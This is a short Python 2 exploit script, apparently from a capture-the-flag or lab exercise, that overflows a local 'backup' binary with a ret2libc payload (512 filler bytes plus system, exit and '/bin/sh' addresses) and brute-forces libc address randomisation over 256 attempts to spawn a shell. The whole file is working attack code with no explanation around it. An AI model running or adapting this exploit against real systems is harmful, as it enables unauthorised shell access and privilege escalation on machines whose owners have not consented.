#!/usr/bin/env python2
import struct
from subprocess import call

libc_base_addr = 0xf752c000      # ldd /usr/local/bin/backup (choose an average value)
exit_off = 0x0002e7b0            # readelf -s /lib32/libc.so.6 | grep exit
system_off = 0x0003a940          # readelf -s /lib32/libc.so.6 | grep system
system_addr = libc_base_addr + system_off
exit_addr = libc_base_addr + exit_off
system_arg = libc_base_addr + 0x15900b # strings -a -t x /lib32/libc.so.6 | grep '/bin/sh'

#endianess convertion
def conv(num):
	return struct.pack("<I",num)

# Junk + system + exit + system_arg
buf = "A" * 512
buf += conv(system_addr)
buf += conv(exit_addr)
buf += conv(system_arg)

print "Calling vulnerable program"

i = 0
while (i < 256):
	print "Number of tries: %d" %i
	i += 1
	ret = call(["./backup", "qq", "45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474", buf])
	if (not ret):
		break
	else:
		print "Exploit failed"
